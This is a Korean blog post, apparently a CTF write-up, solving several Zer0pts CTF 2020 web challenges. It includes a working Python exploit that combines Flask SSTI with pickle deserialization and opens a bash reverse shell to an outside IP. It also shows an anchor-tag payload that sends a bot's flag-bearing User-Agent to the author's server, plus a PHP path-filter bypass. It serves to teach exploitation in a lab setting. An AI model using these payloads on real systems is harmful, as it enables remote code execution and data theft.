---
layout: post
date: 2020-12-26 00:00:00
title: "Zer0pts CTF 2020 Write Up"
categories: CTF
tags: [Python Pickle RCE, SSRF, REDIS, Client Attack]
author:
  - Jeongwon Jo
---
Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다.

```
git clone https://gitlab.com/zer0pts/zer0pts-ctf-2020.git
cd zer0pts-ctf-2020
cd <Desired Problem>
docker-compose up -d ( if the `-d` option given, it is excuted as the backend. )
```

---
## (Web) notepad [332pts]

> notepad 문제는 Python Pickle 모듈의 loads 함수에서 발생하는 RCE 취약점과 Flask SSTI 취약점을 주제로 한 문제입니다. 일단 app.py가 주어지는데 필요한 부분만 확인을 해보겠습니다.

<span style="color:#631F9C">&#62;</span> SSTI Vuln
```python
@app.errorhandler(404)
def page_not_found(error):
    """ Automatically go back when page is not found """
    referrer = flask.request.headers.get("Referer")
    
    if referrer is None: referrer = '/'
    if not valid_url(referrer): referrer = '/'
    
    html = '<html><head><meta http-equiv="Refresh" content="3;URL={}"><title>404 Not Found</title></head><body>Page not found. Redirecting...</body></html>'.format(referrer)
    
    return flask.render_template_string(html), 404
```
404 에러 페이지를 확인해보면 `Referer` 헤더를 가져와서 `URL` 값으로 그대로 사용하는 것을 볼 수 있습니다. Referer의 대한 검증 과정이 존재하지 않아 SSTI 취약점이 발생합니다.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-27%20오후%2012.59.35.png?raw=true)
그래서 Referer 헤더로 &#123;&#123;config&#125;&#125;를 보내주니 SSTI가 발생해서 config 객체를 출력해주는 것을 볼 수 있고, 시크릿 키가 `b'$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m'`라는 것을 알 수 있습니다. 시크릿 키를 구했기 때문에 `session`을 마음대로 조작이 가능할 거 같습니다.

<span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln
```python
@app.route('/note/<int:nid>', methods=['GET'])
def notepad(nid=0):
    data = load()
    
    if not 0 <= nid < len(data):
        nid = 0
    
    return flask.render_template('index.html', data=data, nid=nid)

(생략)

def load():
    """ Load saved notes """
    try:
        savedata = flask.session.get('savedata', None)
        data = pickle.loads(base64.b64decode(savedata))
    except:
        data = [{"date": now(), "text": "", "title": "*New Note*"}]
    
    return data
```
/note를 보면 load() 함수를 호출하는 것을 볼 있습니다. load() 함수는 세션 값에서 `savedata`라는 값을 가져와서 base64 디코딩을 하고, pickle.loads() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. 바로 여기서 RCE 취약점이 발생합니다. 해당 취약점에 자세한 내용은 구글을 통해 확인할 수 있습니다.
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-27%20오후%201.12.42.png?raw=true)
Flask 세션 관련 내용을 정확히 숙지하고 있지 않아서 구글에 검색을 해보니 `sessions.SecureCookieSessionInterface`, `Flask` 두 함수를 이용하면 시크릿 키를 이용해 세션 값을 만들어 줄 수 있는 것을 알 수 있었습니다. 물론 Flask 함수를 쓰지 않고 클래스를 생성해서도 줄 수 있습니다.

그러니 시크릿 키를 이용해서 세션 값을 변조하고, 변조한 세션 값을 가지고, /note/<int:id>로 접근을 해주면 load() 함수의 pickle.loads() 함수가 호출이 돼서 RCE가 발생하게 됩니다. 

<span style="color:#631F9C">&#62;</span> Exploit
```python
import os, sys, base64, pickle, requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

cmd = "bash -c 'bash -i >& /dev/tcp/141.164.52.207/12345 0>&1'"
key_ = b'$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m'
class RCE(object):
  def __reduce__(self):
    return (os.system,(cmd,))
def exploit():
  app = Flask("app")
  app.secret_key = key_
  
  sscsi = SecureCookieSessionInterface()
  signingSerializer = sscsi.get_signing_serializer(app)
  
  session = signingSerializer.dumps({'savedata':base64.b64encode(pickle.dumps(RCE()))})
  print("Sessions : {}".format(session))
  requests.get('http://localhost:8001/note/1', cookies = {'session':session})

if __name__ == '__main__':
  print("[+] RCE in Pickle Start")
  exploit()
```
<strong>그래서 파이썬을 이용해서 위와 같이 RCE POC를 작성해주었습니다. 처음에는 `nc`를 이용해서 쉘을 딸려 했지만 잘 되지 않았습니다. 그래서 그냥 코드 미스인 줄 알았는데 `bash -c`를 이용해서 쉘을 따주니 잘 되었습니다.</strong>
![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-27%20오후%201.35.23.png?raw=true)
<strong>RCE POC를 돌려주니 쉘이 잘 따지는 것을 볼 수 있고, flag도 볼 수 있었습니다. ( nc 명령어를 확인해보니 명령어 자체가 없었음 )</strong>

> FLAG : zer0pts{fl4sk_s3ss10n_4nd_pyth0n_RCE}

---

## (Web) Can you guess it [345pts]

> Can you guess it 문제는 PHP 트릭류 문제입니다.
```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```
<span style="color:#631F9C">&#62;</span> analysis

FLAG는 config.php에 정의가 되어 있다고 합니다.

코드를 보면 `$_SERVER['PHP_SELF']`의 값을 highlight_file() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. `$_SERVER['PHP_SELF']`는 현재 페이지의 주소에서 도메인과 넘어가는 값(파라미터)를 제외한 것들을 가져오는 슈퍼 글로벌 함수 입니다. 즉, Path만 가져온다는 것 입니다.

```php
if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}
```
하지만 preg_match() 함수를 이용해서 `$_SERVER['PHP_SELF']` 값을 검증하고 있기 때문에 일반적으로 접근을 하게 되면 `config.php`가 필터링에 걸리기 때문에 힘들 거 같습니다.

그러다 구글링을 하다가 [여기서](https://ngaa.tistory.com/m/46?category=776250) 신기한 것을 발견했습니다. basename 함수에 \x80-\xff 범위의 값 중 하나만 들어오면 그 값은 무시한다는 것을 알 수 있었습니다.
```
php > echo basename("/index.php/config.php");
config.php
php > echo basename("/index.php/config.php/\xbb");
config.php
php > echo basename("/index.php/config.php/\xab");
config.php
php > echo basename("/index.php/config.php/\xff");
config.php
```
테스트를 해본 결과 \x80-\xff 범위의 값을 모두 무시하는 것을 확인할 수 있었습니다. 그리고 저 범위의 값들이 prge_match에 들어가도 우회가 됩니다.

<span style="color:#631F9C">&#62;</span> Exploit
```
/index.php/config.php/%aa?source
```
위 path로 접근을 해주면 preg_match(), basename() 함수를 우회해 config.php의 소스 코드를 볼 수 있습니다.

> FLAG : zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}

---

## (Web) urlapp [435pts]

> urlapp 문제는 루비로 작성된 Redis 서비스에서 Redis SSRF 취약점을 주제로한 문제입니다. 하지만 왠지 모르게 익스를 계속 시도해도 set 명령어가 제대 인식이 되지 않는 거 같다.
```ruby

(생략)

def set(sock, key, value)
  query(sock, "SET #{key} #{value}")
  return recv(sock) == "OK"
end

def get(sock, key)
  query(sock, "GET #{key}")
  return recv(sock)
end

before do
  sock = connect()
  set(sock, "flag", File.read("flag.txt").strip)
end

get '/' do
  if params.has_key?(:q) then
    q = params[:q]
    if not (q =~ /^[0-9a-f]{16}$/)
      return
    end

    sock = connect()
    url = get(sock, q)
    redirect url
  end

  send_file 'index.html'
end

post '/' do
  if not params.has_key?(:url) then
    return
  end

  url = params[:url]
  if not (url =~ URI.regexp) then
    return
  end

  key = Random.urandom(8).unpack("H*")[0]
  sock = connect()
  set(sock, key, url)

  "#{request.host}:#{request.port}/?q=#{key}"
end
```
취약점은 set 함수를 호출해서 url 값을 value로 이용해서 하나의 데이터를 생성하고 있습니다. 하지만 url 파라미터의 개행문제에 대한 필터링이 존재하지 않아 redis eval 명령어를 이용해서 set, get 명령어를 사용할 수 있게됩니다.

그래서 value 값을 redis.call('get','flag')를 이용해서 flag를 가져와서 value로 넣어주고, 해당 데이터의 키를 이용해서 접근하면 flag를 볼 수 있습니다. 하지만 익스 페이로드를 작성해서 넘겨주니 잘 되지 않았습니다.

다시 풀어 더 정확한 풀이를 남기겠습니다.

---

## (Web) MusicBlog [653pts]

MusicBlog 문제는 딱히 취약점 분류를 하기는 힘들고, 그냥 웹 서비스 로직 결함을 이용해 공격하는 문제입니다. 일단 소스 코드가 많아 로직이 어떤 식으로 돌아가는 지부터 확인을 해보겠습니다.

![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-27%20오후%205.54.19.png?raw=true)<br>
회원 가입을 하고, 로그인을 하면 Post를 작성하는 기능과 Post를 보는 기능이 존재합니다.

![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-27%20오후%205.57.47.png?raw=true)
Post를 작성해주니 이상한 점은 `좋아요`를 눌러주지 않았는데 `좋아요`가 하나 찍힌 것을 볼 수 있다. 아마 Post가 새로 생성이 되면 좋아요가 자동으로 찍히는 로직이 있는 거 같습니다. 더 자세한 내용을 확인하기 위해서 코드를 분석해보겠습니다.

<span style="color:#631F9C">&#62;</span> post.php
```html
(생략)
        <div class="container">
          <h1 class="mt-4">
            <?php if ($post['published'] === '0') { ?><span class="badge badge-secondary">Secret</span><?php } ?>
            <?= $post['title'] ?>
          </h1>
          <span class="text-muted">by <?= $post['username'] ?> <span class="badge badge-love badge-pill">♥ <?= $post['likes'] ?></span></span>
          <div class="mt-3">
            <?= render_tags($post['content']) ?>
          </div>
          <div class="mt-3">
            <a href="like.php?id=<?= $post['id'] ?>" id="like" class="btn btn-love">♥ Like this post</a>
          </div>
        </div>
(생략)

```
post.php를 보면 content의 값을 render_tags() 함수를 이용해서 검증을 하고 출력하는 것을 볼 수 있습니다.

<span style="color:#631F9C">&#62;</span> util.php
```php

<?php
(생략)

// [[URL]] → <audio src="URL"></audio>
function render_tags($str) {
  $str = preg_replace('/\[\[(.+?)\]\]/', '<audio controls src="\\1"></audio>', $str);
  $str = strip_tags($str, '<audio>'); // only allows `<audio>`
  return $str;
}

(생략)
?>
```
util.php를 보면 render_tags() 함수가 존재합니다. preg_replace() 함수를 이용해서 &#91;&#91;ULR&#93;&#93;이라는 값이 들어오면 &lt;audio&gt;로 변환시켜주고, strip_tags() 함수를 이용해서 audio 태그만 허용하고 있는 것을 볼 수 있습니다. 하지만 strip_tags() 함수에서 취약점이 존재합니다.

![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-27%20오후%206.25.19.png?raw=true)
위 사진을 보면 `<a/udio>`라는 문자열이 들어와도 `<audio>`로 인식을 하는 것을 볼 수 있습니다. 중간에 슬래쉬가 들어와도 동일하게 인식을 합니다. 이를 이용해서 오디오 태그 외에 a 태그도 사용을 할 수 있다는 것을 알 수 있습니다.

<span style="color:#631F9C">&#62;</span> worker.js
```javascript
(생략)

const crawl = async (url) => {
    console.log(`[+] Query! (${url})`);
    const page = await browser.newPage();
    try {
        await page.setUserAgent(flag);
        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 3 * 1000,
        });
        page.click('#like');
        await page.waitForNavigation({timeout: 3000});
    } catch (err){
        console.log(err);
    }
    await page.close();
    console.log(`[+] Done! (${url})`)
};

(생략)

```
아까 Post를 생성하면 `좋아요`가 하나 찍히는 것을 확인했습니다. 그래서 해당 로직을 찾아보니 wocker.js에 crawl로 정의를 하는 것을 볼 수 있었습니다.  위 코드는 Post가 생성이 되면 `User-Agent`의 값으로 `FLAG`를 넣고, id 값이 like인 버튼을 클릭해서 `좋아요`를 눌러주는 것을 볼 수 있습니다.

<span style="color:#631F9C">&#62;</span> init.php
```php
header("Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic'; base-uri 'none'; trusted-types");
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
```
그래서 XSS를 이용해서 User-Agent 값을 가져와야 하나 생각을 했지만 위와 같이 CSP가 걸려 있어 불가능해보였습니다,, 하지만 아까 util.php의 render_tags() 함수에서 strip_tags() 함수를 사용해서 태그를 검증하고 있었는데 이때 함수를 우회해서 a 태그를 사용할 수 있었습니다.

그럼 content의 값으로 "&#60;a id='like' href='myip'&#62;&#60;/a&#62;"를 주면 click('#like')에 의해서 User-Agent에 FLAG가 들어있는 상태로 myip로 요청이 갈 것 입니다.

<span style="color:#631F9C">&#62;</span> Exploit

![](https://github.com/wjddnjs33/image2/blob/main/스크린샷%202020-12-27%20오후%206.54.47.png?raw=true)
```html
<a/udio id="like" href="http://141.164.52.207:12345">GG</a>
```
그래서 위 페이로드를 `Content`의 값으로 넘겨주니 요청이 내 서버로 전송이 된 것을 확인할 수 있었고, User-Agent 헤더의 flag가 있는 것도 볼 수 있었습니다.

> FLAG : zer0pts{M4sh1m4fr3sh!!}

---
### (Web) phpNantoKaAdmin [755pts]

귀찮다.


---
